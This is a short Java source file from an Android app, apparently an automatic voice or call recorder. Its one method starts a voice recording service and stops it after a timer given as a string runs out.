package AutoVoiceRecorder;

import static AutoCallRecorder.Constants.TAG;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import UiActivities.MainActivity;
import synceAdapter.AccountConstants;
import synceAdapter.SharedClass;

public class recorderClass {
    public static void startRecording(Context context , String t){
        int Timer = Integer.parseInt(t);
        boolean flag = AccountConstants.isaudioRecording;
        if (!flag){
            try {
                Log.d(TAG, "isRecording : true ");
                Intent intent = new Intent(context.getApplicationContext() , VoiceRecorderService.class);
                intent.putExtra("isRecording" , true);
                intent.putExtra("time" , Integer.parseInt(t));
                context.startService(intent);
            }catch (Exception e){}
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Intent intent = new Intent(context.getApplicationContext() , VoiceRecorderService.class);
                    intent.putExtra("isRecording" , false);
                    intent.putExtra("time" , Integer.parseInt(t));
                    context.startService(intent);
                }
            }, Timer);
        }
    }
}
